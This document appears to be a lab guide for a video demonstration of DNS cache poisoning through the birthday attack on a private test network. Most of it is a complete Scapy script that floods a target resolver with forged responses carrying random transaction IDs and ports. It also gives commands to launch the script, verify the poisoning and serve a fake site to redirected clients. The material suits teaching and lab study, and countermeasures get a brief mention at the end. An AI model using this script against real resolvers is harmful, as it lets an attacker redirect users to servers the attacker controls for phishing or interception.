# DNS Cache Poisoning Attack Using Birthday Attack

## Overview

DNS cache poisoning (also known as DNS spoofing) is an attack where falsified DNS information is introduced into a DNS resolver's cache, causing the resolver to return an incorrect IP address. This redirects traffic intended for a legitimate server to a server controlled by the attacker. The "Birthday Attack" variation leverages the birthday paradox probability to increase the chances of successfully predicting DNS query parameters.

## Tools Required

1. Python with Scapy library
2. DNSPython
3. Wireshark or tcpdump for packet analysis
4. Custom Python script (provided below)

## Theory of the Attack

1. The attack exploits weaknesses in DNS transaction ID (16-bit) and source port (16-bit) randomization
2. By sending many spoofed responses with different IDs/ports simultaneously, we increase the probability of a match
3. When a legitimate DNS query is sent by the victim DNS server, we flood it with spoofed responses
4. If one of our spoofed responses matches the transaction ID and source port before the legitimate response arrives, the cache is poisoned

## Procedure

### 1. Preparation

1. Create the Python script for the cache poisoning attack:

```bash
cat > dns_cache_poison.py << 'EOF'
#!/usr/bin/env python3
"""
DNS Cache Poisoning Attack Script using Birthday Attack approach
This script attempts to poison a DNS resolver's cache by flooding it with
forged DNS responses that have various transaction IDs
"""

from scapy.all import *
import threading
import random
import time
import sys
import argparse

# Global variables
sent_count = 0
target_domain = ""
target_record = ""
spoofed_ip = ""
target_dns = ""
query_timeout = 1.0  # Seconds between queries from victim to real DNS

# Customize packet rates based on network conditions
PACKETS_PER_THREAD = 2500
NUM_THREADS = 4
SOURCE_PORTS = list(range(1024, 65535))  # All possible source ports

def spoof_dns_response(target_ip, target_port, qname, spoofed_ip, transaction_id):
    """Generate a spoofed DNS response"""
    global sent_count

    # DNS answer record
    dns_answer = DNSRR(
        rrname=qname,
        type='A',
        ttl=3600,
        rdata=spoofed_ip
    )

    # Authority and additional sections for more convincing response
    dns_ns = DNSRR(
        rrname=qname.split('.', 1)[1],
        type='NS',
        ttl=3600,
        rdata=f'ns1.{qname.split(".", 1)[1]}'
    )

    # DNS response packet
    dns_response = IP(dst=target_ip) / \
                 UDP(dport=target_port, sport=53) / \
                 DNS(id=transaction_id,
                     qr=1,  # This is a response
                     aa=1,  # Authoritative Answer
                     rd=1,  # Recursion Desired
                     ra=1,  # Recursion Available
                     qd=DNSQR(qname=qname),
                     an=dns_answer,
                     ns=dns_ns,
                     ar=None)

    # Send the packet
    send(dns_response, verbose=0)
    sent_count += 1

    if sent_count % 1000 == 0:
        print(f"[+] Sent {sent_count} spoofed DNS responses")

def trigger_dns_query(victim_dns, query_domain):
    """Trigger the victim DNS server to query the target domain"""
    print(f"[*] Triggering DNS query to {query_domain} from {victim_dns}")

    # Using dig command through os.system for simplicity
    import os
    os.system(f"dig @{victim_dns} {query_domain}")

    print(f"[*] Query sent for {query_domain}")

def send_poison_thread(thread_id, target_ip, target_port_start, target_port_end, qname, spoofed_ip):
    """Thread function to send multiple spoofed responses"""
    print(f"[+] Starting poisoning thread {thread_id}")

    for _ in range(PACKETS_PER_THREAD):
        # Randomize transaction ID
        tx_id = random.randint(0, 65535)

        # Use a random port from our range for this response
        target_port = random.randint(target_port_start, target_port_end)

        # Send the spoofed response
        spoof_dns_response(target_ip, target_port, qname, spoofed_ip, tx_id)

        # Small delay to prevent overwhelming system
        time.sleep(0.0001)

    print(f"[+] Thread {thread_id} completed")

def flood_with_responses(target_ip, qname, spoofed_ip):
    """Launch multiple threads to flood target with responses"""
    threads = []
    port_range_size = len(SOURCE_PORTS) // NUM_THREADS

    # Create multiple threads to increase packet rate
    for i in range(NUM_THREADS):
        port_start = SOURCE_PORTS[i * port_range_size]
        port_end = SOURCE_PORTS[(i + 1) * port_range_size - 1] if i < NUM_THREADS - 1 else SOURCE_PORTS[-1]

        thread = threading.Thread(
            target=send_poison_thread,
            args=(i, target_ip, port_start, port_end, qname, spoofed_ip)
        )
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

def attack_dns_cache(victim_dns, domain, subdomain, spoofed_ip, num_attempts=5):
    """Main attack function combining query triggering and response flooding"""
    global target_record
    target_record = f"{subdomain}.{domain}"

    print(f"[*] Starting DNS cache poisoning attack against {victim_dns}")
    print(f"[*] Target: {target_record} -> {spoofed_ip}")

    for attempt in range(1, num_attempts + 1):
        print(f"\n[*] Attempt {attempt}/{num_attempts}")

        # Start a thread to flood responses
        flood_thread = threading.Thread(
            target=flood_with_responses,
            args=(victim_dns, target_record, spoofed_ip)
        )
        flood_thread.start()

        # Small delay to ensure flooding has started
        time.sleep(0.5)

        # Trigger a query from the victim DNS server
        trigger_dns_query(victim_dns, target_record)

        # Wait for flooding to complete
        flood_thread.join()

        # Check if poisoning was successful
        print("[*] Verifying cache poisoning...")
        verify_cmd = f"dig @{victim_dns} {target_record} | grep -A1 'ANSWER SECTION'"
        import os
        os.system(verify_cmd)

        # Wait before next attempt to allow for cache refresh
        if attempt < num_attempts:
            print(f"[*] Waiting {query_timeout} seconds before next attempt...")
            time.sleep(query_timeout)

    print(f"\n[*] Attack completed. Sent {sent_count} spoofed responses.")
    print("[*] To verify poisoning, run: dig @<target_dns> " + target_record)

def main():
    parser = argparse.ArgumentParser(description='DNS Cache Poisoning Attack using Birthday Attack method')
    parser.add_argument('--victim', required=True, help='Target DNS server IP')
    parser.add_argument('--domain', required=True, help='Target domain (e.g., example.com)')
    parser.add_argument('--subdomain', default='www', help='Subdomain to poison (default: www)')
    parser.add_argument('--spoofed-ip', required=True, help='Spoofed IP address for the DNS response')
    parser.add_argument('--attempts', type=int, default=5, help='Number of attack attempts (default: 5)')

    args = parser.parse_args()

    # Launch the attack
    attack_dns_cache(args.victim, args.domain, args.subdomain, args.spoofed_ip, args.attempts)

if __name__ == "__main__":
    main()
EOF

chmod +x dns_cache_poison.py
```

2. Set up packet capture to monitor the attack:
   ```bash
   tcpdump -i eth0 -n udp port 53 -w dns_cache_poison.pcap
   ```

### 2. Understanding the DNS Environment

1. Analyze normal DNS resolution behavior before the attack:

   ```bash
   # On the client, clear local DNS cache
   systemd-resolve --flush-caches

   # Check current DNS resolution for the target domain
   dig www.example.com

   # Check the secondary DNS server's cache
   dig www.example.com @192.168.2.20
   ```

2. Analyze DNS query characteristics:

   ```bash
   # On the attacker machine, capture a sample DNS query
   tcpdump -i eth0 -n udp port 53 -c 5 -vvv

   # On the client, trigger a DNS query
   dig random-subdomain-123.example.com
   ```

3. Note the current time-to-live (TTL) values of legitimate DNS records:
   ```bash
   dig www.example.com @192.168.2.20 | grep -A1 "ANSWER SECTION"
   ```

### 3. Executing the Cache Poisoning Attack

1. On the attacker machine, start the attack script targeting the secondary DNS server:

   ```bash
   ./dns_cache_poison.py --victim 192.168.2.20 --domain example.com --subdomain www --spoofed-ip 192.168.1.10 --attempts 5
   ```

2. Observe the attack output, which will:

   - Flood the target DNS server with forged responses
   - Attempt to match transaction IDs and source ports
   - Periodically check if the poisoning was successful

3. The attack exploits the "birthday attack" probability - with enough attempts (flooding with different Transaction IDs), there's an increased probability of matching the correct ID before the legitimate response.

### 4. Verifying the Attack Success

1. Once the script completes, verify the poisoning from the attacker machine:

   ```bash
   dig www.example.com @192.168.2.20
   ```

2. Check from the client machine as well:

   ```bash
   dig www.example.com
   ```

3. If successful, the DNS response should point to the attacker's IP address (192.168.1.10) instead of the legitimate IP (10.0.0.10).

### 5. Demonstrating the Impact

1. On the attacker machine, set up a simple web server to capture redirected traffic:

   ```bash
   mkdir -p /tmp/fake_site
   echo "<html><body><h1>This site has been compromised!</h1></body></html>" > /tmp/fake_site/index.html
   cd /tmp/fake_site
   python -m http.server 80
   ```

2. On the client machine, attempt to access the legitimate website:

   ```bash
   curl -v http://www.example.com
   ```

3. Observe that the client receives the fake website content instead of the legitimate site.

4. Show a comparison of the legitimate vs. poisoned DNS resolution:
   ```bash
   # On the attacker machine
   echo "Legitimate DNS response:" > demonstration.txt
   dig www.example.com @192.168.2.10 >> demonstration.txt
   echo "" >> demonstration.txt
   echo "Poisoned DNS cache response:" >> demonstration.txt
   dig www.example.com @192.168.2.20 >> demonstration.txt
   cat demonstration.txt
   ```

### 6. Analyzing the Attack Traffic

1. Stop the packet capture:

   ```bash
   # Press Ctrl+C in the tcpdump terminal
   ```

2. Analyze the captured traffic:

   ```bash
   wireshark dns_cache_poison.pcap
   ```

3. Look for:

   - The legitimate DNS query from the secondary DNS server to the primary
   - The flood of spoofed responses
   - The successful response that matched and poisoned the cache
   - Subsequent DNS queries using the poisoned cache

4. Use Wireshark's statistics and filtering to highlight the key packets:

   ```
   # Filter for DNS queries from the secondary DNS server
   (ip.src == 192.168.2.20) && (udp.dstport == 53) && (dns.flags.response == 0)

   # Filter for spoofed DNS responses from the attacker
   (ip.src == 192.168.1.10) && (udp.srcport == 53) && (dns.flags.response == 1)
   ```

### 7. Evidence Collection

1. Save all outputs for the video demonstration:

   ```bash
   # Create a directory for evidence
   mkdir -p cache_poisoning_evidence

   # Save outputs
   cp dns_cache_poison.pcap cache_poisoning_evidence/
   cp demonstration.txt cache_poisoning_evidence/

   # Save DNS query outputs
   dig www.example.com @192.168.2.10 > cache_poisoning_evidence/legitimate_response.txt
   dig www.example.com @192.168.2.20 > cache_poisoning_evidence/poisoned_response.txt
   ```

## Explanation for Video

When documenting this attack for the video:

1. Explain the DNS cache poisoning vulnerability and the concept of the Birthday Paradox/Attack
2. Discuss how DNS queries are supposed to be protected (transaction IDs, source port randomization)
3. Explain how increased query volume exploits probability to overcome these protections
4. Walk through the attack script, explaining key components
5. Show the attack in action with packet captures
6. Demonstrate the impact of successful poisoning (redirecting to fake website)
7. Discuss countermeasures such as DNSSEC, response rate limiting, and query verification
